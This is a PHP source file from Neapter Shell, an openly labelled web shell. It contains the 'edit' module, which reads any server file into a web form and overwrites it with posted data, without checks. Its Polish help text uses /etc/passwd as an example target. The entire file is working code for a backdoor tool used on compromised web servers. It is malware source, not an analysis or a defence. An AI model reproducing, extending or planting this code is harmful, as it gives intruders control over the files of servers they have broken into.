<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Edit file content
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleEdit extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('edit');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
edit - Edycja oraz tworzenie nowego pliku

    Użycie:
        edit /etc/passwd
        edit /sciezka/do/nowego/pliku
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        $sFile = $this->oArgs->getRawData();

        if (($sFiledata = Request::getPost('filedata')) !== false) {
            return sprintf(
                'Plik %szostał zapisany',
                (! @file_put_contents($sFile, $sFiledata) ? 'nie ' : '')
            );
        }

        if ($this->oArgs->getNumberOfParams() === 0) {
            return self::getHelp();
        }

        return sprintf(
            '<form action="%s" method="post" autocomplete="on">' .
            '<textarea id="edit" name="filedata">%s</textarea><br/>' .
            '<input type="text" name="cmd" readonly="readonly" value=":edit %s" size="110" id="cmd"/>' .
            '<input type="submit" name="submit" value="Zapisz" /></form>',
            Request::getCurrentUrl(),
            (string) file_get_contents($sFile),
            $sFile,
            htmlspecialchars(Request::getPost('cmd'))
        );
    }
}
